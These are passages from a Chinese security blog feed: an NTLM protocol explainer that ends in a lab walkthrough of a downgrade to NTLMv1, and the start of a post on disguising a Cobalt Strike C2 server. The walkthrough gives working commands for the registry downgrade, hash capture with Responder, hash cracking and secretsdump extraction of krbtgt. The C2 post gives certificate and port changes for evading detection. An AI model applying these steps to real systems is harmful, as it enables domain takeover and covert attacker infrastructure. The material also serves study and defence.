2消息，读取出服务端所支持的内容，并取出其中的Challenge质询值，用缓存的服务器密码的NTLM Hash对其进行加密得到Response消息，Response消息中可以提取出Net-NTLM Hash。最后将Response和一些其他信息封装到NTLMSSP_AUTH消息中（被称为<strong>Type 3 Authenticate认证消息</strong>），发往服务端。</p><p>④：服务端接收到客户端发送来的 NTLMSSP_AUTH 认证消息后，通过Netlogon协议与域控建立一个安全通道，将验证消息发给域控。</p><p>⑤：域控收到服务端发来的验证消息后，从中取出Net-NTLM Hash。然后从数据库中找到该用户的NTLM Hash，对Challenge进行一系列加密运算，得到自己计算的Net-NTLM Hash。并比较自己计算出的Net-NTLM Hash和服务端发送的Net-NTLM Hash是否相等，如果相等，则证明客户端输入的密码正确，认证成功，反之认证失败，域控将验证结果发给服务端。</p><p>⑥：服务端根据DC返回的结果，对客户端进行回复。</p><p>以上就是域环境下NTLM认证的流程。下面我们来使用WireShark对NTLM认证流程进行抓包查看：</p><h3 id="1-域环境下NTLM认证抓包"><a href="#1-域环境下NTLM认证抓包" class="headerlink" title="(1) 域环境下NTLM认证抓包"></a>(1) 域环境下NTLM认证抓包</h3><p>由于NTLM只是底层的认证协议，其必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP等。如下实验是基于SMB服务利用NTLM进行验证。</p><p>实验环境如下:</p><ul><li>客户端(WIN7)：10.211.55.6</li><li>服务端(MAIL)：10.211.55.5</li><li>域控(AD01)：10.211.55.4</li></ul><p>如图1-40所示，是域环境下NTLM认证拓扑图。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630393050329-5167752c-d46f-4aa0-bcac-8ce82bbac2cf.png" alt="img"></p><p>如图1-41所示是认证成功的数据包。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620998729935-55cc79f8-7d18-4a2d-b1db-5d327515d236.png" alt="img"></p><p>如图1-42所示是认证失败的数据包。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620998773183-c472ff0e-861a-49ef-92b5-079f873b53e0.png" alt="img"></p><p>由于数据包的字段和在工作组中的含义一样，此处不再详述。</p><h2 id="3-NTLM-v1和NTLM-v2的区别"><a href="#3-NTLM-v1和NTLM-v2的区别" class="headerlink" title="3. NTLM v1和NTLM v2的区别"></a>3. NTLM v1和NTLM v2的区别</h2><p>NTLM v1身份认证协议和NTLM v2身份认证协议是NTLM身份认证协议的不同版本。目前使用最多的是NTLM v2版本。NTLM v1与NTLM v2最显著的区别就是Challenge质询值与加密算法不同，共同之处就是都是使用的 NTLM Hash进行加密。</p><p><strong>Challenge质询值</strong>：</p><ul><li><ul><li>NTLM v1： 8字节</li><li>NTLM v2：16字节</li></ul></li></ul><p><strong>Net-NTLM Hash使用的加密算法</strong>：</p><ul><li><ul><li>NTLM v1：DES加密算法</li><li>NTLM v2：HMAC-MD5加密算法</li></ul></li></ul><p>我们来看看NTLM v1的Response消息是如何生成的，如下：</p><p>1）将16字节的NTLM hash空填充为21个字节</p><p>2）然后分成三组，每组7比特，作为3DES加密算法的三组密钥</p><p>3）分别利用三组密码DES加密服务端发来的Challenge值</p><p>4）将这三个密文值连接起来得到Response</p><p>Net-NTLM v1 hash的格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">username<span class="token punctuation">:</span><span class="token punctuation">:</span>hostname<span class="token punctuation">:</span>LM response<span class="token punctuation">:</span>NTLM response<span class="token punctuation">:</span>challenge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图1-43所示，我们使用工具InternalMonologue.exe抓取Net-NTLM v1 hash。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630393542477-35bda858-ac75-4b9e-a81a-f487e0925f26.png" alt="img"></p><h2 id="4-LmCompatibilityLevel"><a href="#4-LmCompatibilityLevel" class="headerlink" title="4. LmCompatibilityLevel"></a>4. LmCompatibilityLevel</h2><p>LmCompatibilityLevel值用来确定网络登录使用的质询&#x2F;响应身份验证协议。此选项会影响客户端使用的身份验证协议的等级、协商的会话安全的等级以及服务器接受的身份验证的等级，如下是LmCompatibilityLevel为不同值的含义:</p><table><thead><tr><th><strong>LmCompatibilityLevel值</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>0</td><td>客户端使用LM和NTLM身份验证，但从不使用NTLM v2 会话安全性。域控制器接受LM、NTLM和NTLM v2身份验证。</td></tr><tr><td>1</td><td>客户端使用LM和NTLM身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2会话安全性。域控制器接受LM、NTLM和NTLM v2身份验证。</td></tr><tr><td>2</td><td>客户端仅使用NTLM身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2会话安全性。域控制器接受LM、NTLM和NTLM v2身份验证。</td></tr><tr><td>3</td><td>客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2会话安全性。域控制器接受LM、NTLM和NTLM v2身份验证。</td></tr><tr><td>4</td><td>客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2会话安全性。域控制器拒绝LM身份验证，但接受NTLM和NTLM v2身份验证。</td></tr><tr><td>5</td><td>客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2会话安全性。域控制器拒绝LM和NTLM身份验证，但接受NTLM v2身份验证。</td></tr></tbody></table><p>我们可以手动修改本地安全策略进行LmCompatibilityLevel值的修改。打开本地安全策略——&gt;安全设置——&gt;本地策略——&gt;安全选项——网络安全: LAN管理器身份验证级别，默认其值是没有定义。没有定义的话，就是使用的默认值。</p><p>如图1-44所示，可以看到“网络安全: LAN管理器身份验证级别”默认是没有定义的。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630393827390-25d04190-3615-4eb0-b416-cf9b01224385.png" alt="img"></p><p>要修改成哪种响应，选中该响应类型，然后应用即可。如图1-45所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630393937525-cf69fb3e-29be-4320-9a65-225881a32d68.png" alt="img"></p><p>或者也可以执行命令修改注册表HKLM\SYSTEM\CurrentControlSet\Control\Lsa\lmcompatibilitylevel字段的值来修改该响应类型，默认情况下是没有lmcompatibilitylevel字段的。如图1-46所示在HKLM\SYSTEM\CurrentControlSet\Control\Lsa下没有lmcompatibilitylevel字段：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644325843322-bcd8d7af-f3a4-4b74-b1eb-c513845be4bb.png" alt="img"></p><p>注册表HKLM\SYSTEM\CurrentControlSet\Control\Lsa\lmcompatibilitylevel字段的值对应的响应如图1-47所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630394171489-42ae3ceb-4b94-43bf-b24c-afc181f91d26.png" alt="img"></p><p>可以通过如下命令修改注册表lmcompatibilitylevel的值为2：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ <span class="token operator">/</span>v lmcompatibilitylevel <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">2</span> <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图1-48所示，可以看到执行命令修改注册表成功！</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644326008875-eb8df248-1b7a-4710-8904-9b47553d7f8a.png" alt="img"></p><p>接着再次查看HKLM\SYSTEM\CurrentControlSet\Control\Lsa\lmcompatibilitylevel字段，如图1-49所示，可以看到已经有该字段了，并且其值为2。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1644326233960-0918ca06-b515-40c1-ac5a-53448650baed.png" alt="img"></p><h1 id="NTLM协议的安全问题"><a href="#NTLM协议的安全问题" class="headerlink" title="NTLM协议的安全问题"></a>NTLM协议的安全问题</h1><p>从上面NTLM认证的流程中我们可以看到，在Type 3 Auth认证消息中是使用用户密码的Hash计算的。因此当我们没有拿到用户密码的明文而只拿到Hash的情况下，我们可以进行**Pass The Hash(PTH)<strong>攻击，也就是大家所说的哈希传递攻击。同样，还是在Type3消息中，存在Net-NTLM Hash，当攻击者获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，这种攻击手法也就是大家所说的</strong>NTLM Relay(NTLM 中继)**攻击。并且由于NTLM v1版本协议加密过程存在天然缺陷，可以对Net-NTLM v1 Hash进行爆破，得到NTLM Hash。拿到NTLM Hash后即可进行横向移动。</p><h2 id="1-Pass-The-Hash"><a href="#1-Pass-The-Hash" class="headerlink" title="1. Pass The Hash"></a>1. Pass The Hash</h2><p>Pass The Hash(PTH)哈希传递攻击是内网横向移动的一种方式。主要原因是NTLM认证过程中使用的是用户密码的NTLM Hash来进行加密。因此当我们获取到了用户密码的NTLM Hash而没有解出明文时，我们可以利用该NTLM Hash进行哈希传递攻击，对内网其他机器进行Hash碰撞，碰撞到使用相同密码的机器。然后通过135或445端口横向移动到使用该密码的其他机器；具体有关Pass The Hash哈希传递攻击的详细攻击细节会在后面的4.9章节中详细介绍。</p><h2 id="2-NTLM-Relay"><a href="#2-NTLM-Relay" class="headerlink" title="2. NTLM Relay"></a>2. NTLM Relay</h2><p>NTLM Relay其实严格意义上并不能叫NTLM Relay，而是应该叫 Net-NTLM Relay。它是发生在NTLM认证的第三步，在 Response消息中存在Net-NTLM Hash，当攻击者获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，这种攻击手法也就是大家所说的NTLM Relay(NTLM 中继)攻击。具体有关NTLM Relay的详细攻击细节会在后面的4.7章节中详细介绍。</p><h2 id="3-Net-NTLM-v1-Hash破解"><a href="#3-Net-NTLM-v1-Hash破解" class="headerlink" title="3. Net-NTLM v1 Hash破解"></a>3. Net-NTLM v1 Hash破解</h2><p>由于NTLM v1身份认证协议加密过程存在天然缺陷，只要获取到Net-NTLM v1 Hash，都能破解为NTLM hash，这与密码强度无关。在域环境中这更有效，因为域中使用hash即可远程连接目标机器。如果域控允许发送NTLM v1响应的话，我们就可以通过与域控机器进行NTLM认证，然后抓取域控的Net-NTLM v1 Hash，破解为NTLM Hash。使用域控的机器账号和哈希即可导出域内所有用户哈希！</p><p>但是自从Windows Vista开始，微软就默认使用NTLM v2身份认证协议，要想降级到NTLM v1的话，需要手动进行修改，并且需要目标主机的管理员权限才能进行操作。</p><p>如下操作开启目标主机支持NTLM v1响应：</p><p>打开本地安全策略——&gt;安全设置——&gt;本地策略——&gt;安全选项——&gt;网络安全: LAN管理器身份验证级别。如图1-50所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630378103317-d77aa689-7a84-446d-8371-c14452de47e6.png" alt="img"></p><p>然后将其修改为仅发送NTLM响应，如图1-51所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630378201397-9dc9b42d-d766-4a1f-ac6c-04d140cbb9bd.png" alt="img"></p><p>或者可以执行如下命令修改注册表：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#修改注册表开启Net-NTLM v1:</span>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ <span class="token operator">/</span>v lmcompatibilitylevel <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">2</span> <span class="token operator">/</span>f<span class="token comment">#为确保Net-NTLMv1开启成功，再修改两处注册表键值</span>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ <span class="token operator">/</span>v NtlmMinClientSec <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">536870912</span> <span class="token operator">/</span>freg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ <span class="token operator">/</span>v RestrictSendingNTLMTraffic <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">0</span> <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图1-52所示，执行命令修改注册表成功！</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630377956728-d55c86ca-ca5b-4090-b577-0d705baf3c6d.png" alt="img"></p><p>然后我们使用Responder抓取目标主机的Net-NTLM v1 Hash。注意，新版本的Responder的Challenge质询值为任意值，我们需要修改Responder.conf文件的Challenge的值为 1122334455667788。如图1-53所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630373844102-05f0306d-272d-4d59-9f88-dec617322885.png" alt="img"></p><p>然后使用Responder执行如下命令进行Net-NTLM v1 Hash的监听，之后使用打印机漏洞或Petitpotam触发域控机器强制向我们的机器进行NTLM认证，即可收到域控的Net-NTLM v1 Hash了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">responder <span class="token operator">-</span>I eth0 <span class="token operator">-</span><span class="token operator">-</span>lm <span class="token operator">-</span>rPv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图1-54所示，可以看到Responder收到域控的Net-NTLM v1 Hash了。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630373916604-6f2894be-fb09-4d4f-bada-88b84e77ad12.png" alt="img"></p><p>然后使用ntlmv1.py脚本执行如下命令对Net-NTLM v1 Hash进行分析，即可得到NTHASH。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 ntlmv1<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>ntlmv1 AD01$<span class="token punctuation">:</span><span class="token punctuation">:</span>XIE<span class="token punctuation">:</span>8EE7FF2234CA7E2887069AB8046F05E631C9F8607CC528FF<span class="token punctuation">:</span>8EE7FF2234CA7E2887069AB8046F05E631C9F8607CC528FF<span class="token punctuation">:</span><span class="token number">1122334455667788</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图1-55所示，执行ntlmv1.py脚本对Net-NTLM v1 Hash进行分析，得到NTHASH。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630374060044-0bda25cf-3f33-4d4f-808d-38dfbf1ebaa9.png" alt="img"></p><p>然后将上一步得到的NTHASH值拿去<a href="https://crack.sh/get-cracking/%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%A0%B4%E8%A7%A3%EF%BC%8C%E8%BE%93%E5%85%A5%E8%BF%99%E4%B8%AANTHASH%E5%80%BC%E5%92%8C%E6%8E%A5%E6%94%B6%E7%BB%93%E6%9E%9C%E7%9A%84%E9%82%AE%E7%AE%B1%E5%8D%B3%E5%8F%AF%E3%80%82%E6%88%96%E8%80%85%E5%B0%86%E5%85%B6%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E6%A0%BC%E5%BC%8F%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E7%A0%B4%E8%A7%A3%E3%80%82">https://crack.sh/get-cracking/网站进行破解，输入这个NTHASH值和接收结果的邮箱即可。或者将其转换为另外一种格式也可以进行破解。</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">NTHASH<span class="token punctuation">:</span>8EE7FF2234CA7E2887069AB8046F05E631C9F8607CC528FF或$NETNTLM$<span class="token number">1122334455667788</span>$8EE7FF2234CA7E2887069AB8046F05E631C9F8607CC528FF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如图1-56所示，输入NTHASH和邮箱进行破解。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630375121102-6017d09a-7469-40ef-bd05-f63186997680.png" alt="img"></p><p>过几十秒后，我们的邮箱就收到了破解网站发来的邮件了。Key值也就是目标的NTLM Hash。如图1-57所示：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630374408350-158c9e9a-c75f-4e98-89f5-871ffa902421.png" alt="img"></p><p>然后我们可以利用该NTLM Hash值以域控机器账号身份执行如下命令导出域内所有用户哈希。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 secretsdump<span class="token punctuation">.</span>py xie<span class="token operator">/</span>AD01\$@<span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.4</span>  <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span>efab19d515b5ff969709df4cfcf387ef <span class="token operator">-</span>dc<span class="token operator">-</span>ip <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.4</span> <span class="token operator">-</span>just<span class="token operator">-</span>dc<span class="token operator">-</span>user krbtgt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图1-58所示，导出krbtgt用户哈希：</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1630374620107-84ebda31-f77d-4899-bf58-fec3a1e13c4e.png" alt="img"></p><p>非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/640-20230306214031031.png" alt="图片"></p><p>参考：<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi">https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthn/ssp-packages-provided-by-microsoft">https://docs.microsoft.com/zh-cn/windows/win32/secauthn/ssp-packages-provided-by-microsoft</a></p><p><a href="http://davenport.sourceforge.net/ntlm.html">http://davenport.sourceforge.net/ntlm.html</a></p><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4</a></p><p>相关文章：<a href="https://cloud.tencent.com/developer/article/1645398">https://cloud.tencent.com/developer/article/1645398</a></p><p><a href="https://mp.weixin.qq.com/s/FbA1BshhyQFWsW4nAgxQFw">https://mp.weixin.qq.com/s/FbA1BshhyQFWsW4nAgxQFw</a></p><p><a href="https://www.cnblogs.com/backlion/p/10843067.html">https://www.cnblogs.com/backlion/p/10843067.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何隐蔽你的C2</title>
      <link href="2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/"/>
      <url>2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/</url>
      
        <content type="html"><![CDATA[<p>在红蓝对抗中，如果攻击者不通过手段隐藏C2服务器，这样可能导致C2被溯源以及被反撸。以下内容讲述如何通过手段隐蔽C2。</p><h1 id="端口特征修改"><a href="#端口特征修改" class="headerlink" title="端口特征修改"></a>端口特征修改</h1><p>CobaltStrike的连接端口默认为50050，这是个很明显的特征。要想修改这个默认端口，我们可以修改teamserver文件，将50050端口改成任意其他端口均可。</p><p><a href="https://p1.ssl.qhimg.com/t0124bd80cb7acddb87.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596324541-d95c405a-6d30-480c-8e1d-6bfe4ead5cdd.png" alt="img"></a></p><h1 id="证书特征修改"><a href="#证书特征修改" class="headerlink" title="证书特征修改"></a>证书特征修改</h1><p>Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。</p><p>Keystore是什么？keystore是java的密钥库，用来进行通信加密，如数字签名。keystore就是用来保存密钥对的公钥和私钥。Keystore可理解为一个数据库，可以存放很多个组数据。</p><p>每组数据主要包含以下两种数据:</p><ul><li>密钥实体：密钥(secret key)又或者私钥和配对公钥(采用非对称加密)</li><li>可信任的证书实体：只包含共钥</li></ul><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645604516654-4a108930-fe92-4f62-bdc4-4ed83ed66bcb.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">查看证书文件：keytool <span class="token operator">-</span><span class="token builtin">list</span> <span class="token operator">-</span>v <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store修改证书密码：keytool <span class="token operator">-</span>storepasswd <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store修改keystore的alias别名：keytool <span class="token operator">-</span>changealias <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store <span class="token operator">-</span>alias source_name <span class="token operator">-</span>destalias new_name修改alias（别名）的密码：keytool <span class="token operator">-</span>keypasswd <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store <span class="token operator">-</span>alias source_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>keystore</strong></p><p>查看CobaltStrike的默认store文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keytool <span class="token operator">-</span><span class="token builtin">list</span> <span class="token operator">-</span>v <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645600478394-52c7270b-c934-416b-9537-a239718eb8ff.png" alt="img"></p><p>可以看出CobaltStrike默认的store文件中的Alias name 、Onwer 和 Issuer 的信息，特征都比较明显。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Alias name<span class="token punctuation">:</span> cobaltstrikeOnwer<span class="token punctuation">:</span> CN<span class="token operator">=</span>Major Cobalt Strike<span class="token punctuation">,</span> OU<span class="token operator">=</span>AdvancedPenTesting<span class="token punctuation">,</span> O<span class="token operator">=</span>cobaltstrike<span class="token punctuation">,</span> L<span class="token operator">=</span>Somewhere<span class="token punctuation">,</span> ST<span class="token operator">=</span>Cyberspace<span class="token punctuation">,</span> C<span class="token operator">=</span>EarthIssuer<span class="token punctuation">:</span> CN<span class="token operator">=</span>Major Cobalt Strike<span class="token punctuation">,</span> OU<span class="token operator">=</span>AdvancedPenTesting<span class="token punctuation">,</span> O<span class="token operator">=</span>cobaltstrike<span class="token punctuation">,</span> L<span class="token operator">=</span>Somewhere<span class="token punctuation">,</span> ST<span class="token operator">=</span>Cyberspace<span class="token punctuation">,</span> C<span class="token operator">=</span>Earth<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过直接访问CobaltStrike服务器的端口，也可以看到证书信息。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">62345</span> <span class="token operator">-</span>v <span class="token operator">-</span>k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645600508000-1593a2be-1d8f-4c1e-8079-b84d7efda7ec.png" alt="img"></p><p>使用浏览器访问也可以看到提示证书无效</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645600566819-4662a6d8-05c7-49dd-83d9-ea5652368a49.png" alt="img"></p><p>而百度这类正常域名则可以看到证书有效</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645600609157-c6f28e51-803c-41de-9c38-93b5d8fa60d1.png" alt="img"></p><h2 id="修改服务端证书CobaltStrike-store"><a href="#修改服务端证书CobaltStrike-store" class="headerlink" title="修改服务端证书CobaltStrike.store"></a>修改服务端证书CobaltStrike.store</h2><p>服务器端使用的证书CobaltStrike.store，为了掩盖默认SSL证书存在的特征，需要重新创建一个新的不一样的证书 。使用以下命令创建证书：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keytool <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>storepass 密码 <span class="token operator">-</span>keypass 密码 <span class="token operator">-</span>genkey <span class="token operator">-</span>keyalg RSA <span class="token operator">-</span>alias google<span class="token punctuation">.</span>com <span class="token operator">-</span>dname <span class="token string">"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>-alias 指定别名</li><li>-storepass pass 和 -keypass pass 指定密钥</li><li>-keyalg 指定算法</li><li>-dname 指定所有者信息</li></ul><p>先删除 CobaltStrike 自带的 cobaltstrike.store，然后使用以下命令生成一个新的 cobaltstrike.store 即可！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keytool <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>storepass <span class="token number">123456</span> <span class="token operator">-</span>keypass <span class="token number">123456</span> <span class="token operator">-</span>genkey <span class="token operator">-</span>keyalg RSA <span class="token operator">-</span>alias baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>dname <span class="token string">"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)"</span>keytool <span class="token operator">-</span>importkeystore <span class="token operator">-</span>srckeystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>destkeystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>deststoretype pkcs12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645604610678-f570639e-b169-467a-8250-d049e78b0e05.png" alt="img"></p><p>再次访问可以看到证书信息已经很明显的改变了</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645604685967-e5e2bb38-47c0-4947-82fc-0665736a82f5.png" alt="img"></p><p>但是由于是自签名的证书，故还是提示证书无效。</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645604743452-f230e9e1-a9bf-4deb-bff9-965c5d1dbd25.png" alt="img"></p><h2 id="修改上线的证书"><a href="#修改上线的证书" class="headerlink" title="修改上线的证书"></a>修改上线的证书</h2><p>cobaltStrike.store 仅仅是服务器端连接的证书。通过https上线使用的证书，不是 cobaltstrike.store，并且，该证书也是默认的！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subject<span class="token punctuation">:</span> C<span class="token operator">=</span><span class="token punctuation">;</span> ST<span class="token operator">=</span><span class="token punctuation">;</span> L<span class="token operator">=</span><span class="token punctuation">;</span> O<span class="token operator">=</span><span class="token punctuation">;</span> OU<span class="token operator">=</span><span class="token punctuation">;</span> CN<span class="token operator">=</span>issuer<span class="token punctuation">:</span>  C<span class="token operator">=</span><span class="token punctuation">;</span> ST<span class="token operator">=</span><span class="token punctuation">;</span> L<span class="token operator">=</span><span class="token punctuation">;</span> O<span class="token operator">=</span><span class="token punctuation">;</span> OU<span class="token operator">=</span><span class="token punctuation">;</span> CN<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看监听的https端口证书，可以看出证书值都是空的</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645604966026-ff25efae-2047-4a18-815b-3808d680571e.png" alt="img"></p><p>如果想要修改这个证书，需要修改Malleable C2 profile。详情看官方文档：<a href="https://www.cobaltstrike.com/help-malleable-c2">https://www.cobaltstrike.com/help-malleable-c2</a></p><p>Self-signed Certificates with SSL Beacon 和 Valid SSL Certificates with SSL Beacon 这两个都是用来修改https上线使用的证书的。</p><ul><li>Self-signed Certificates with SSL Beacon 这里是自己设定的自签名证书。</li><li>Valid SSL Certificates with SSL Beacon 这里是叫我们使用有效的证书。我们可以使用之前修改过的cobaltstrike.store，也可以使用从其他地方弄过来的证书</li></ul><p><a href="https://img-blog.csdnimg.cn/20201218162652908.png"><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645596331439-1e494f9a-d96c-4fb4-a719-bbc57170cf53.png" alt="img"></a></p><p>我们可以在启动CobaltStrike的时候，指定一个profile文件，然后在文件中配置上线时使用的证书文件即可修改上线时默认的证书。如下，我们在profile文件中指定https上线证书也是cobaltstrike.store</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645605075113-859fb0da-65fd-4af7-a142-32eddc1495fb.png" alt="img"></p><p>然后在启动CobaltStrike时指定该profile文件，再次探测上线端口，可以看到证书信息变了</p><p><img src="/2021/02/24/nei-wang-shen-tou/ru-he-yin-bi-ni-de-c2/1645605133544-3afb9834-ef35-4071-88e5-5d3628f61e13.png" alt="img"></p><h1 id="流量特征修改"><a href="#流量特征修改" class="headerlink" title="流量特征修改"></a>流量特征修改</h1><p>流量特征修改使用域前置技术，域前置是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p><p>简言之，利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信，效果如下：</p><p><a href="https://img-blog.csdnimg.cn/20210211103220446.png"><img 